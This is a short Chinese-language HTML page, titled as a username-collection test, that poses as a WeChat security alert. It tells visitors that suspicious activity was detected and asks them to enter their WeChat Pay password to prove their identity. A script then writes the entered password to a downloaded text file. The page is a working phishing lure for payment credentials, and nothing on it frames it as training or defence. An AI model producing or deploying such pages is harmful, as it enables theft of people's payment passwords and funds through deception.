<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>PGM 用户名采集测试</title>
</head>
<body>
  <h2>我们检测到你的微信存在可疑行为，输入验证是否是本人</h2>
  <form onsubmit="saveToFile(); return false;">
    <label for="username">请输入微信支付密码：</label><br>
    <input type="text" id="username" name="username" required><br><br>
    <input type="submit" value="提交">
  </form>

  <p id="status" style="color: green; font-weight: bold;"></p>

  <script>
    function saveToFile() {
      const username = document.getElementById('username').value.trim();
      if (!username) {
        alert("请输入微信支付密码！");
        return;
      }

      const content = "微信支付密码: " + username;
      const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
      const link = document.createElement("a");
      link.href = URL.createObjectURL(blob);
      link.download = "d.txt";
      link.click();

      document.getElementById('status').innerText = "OK，数据已保存为 d.txt 文件。";
    }
  </script>
</body>
</html>
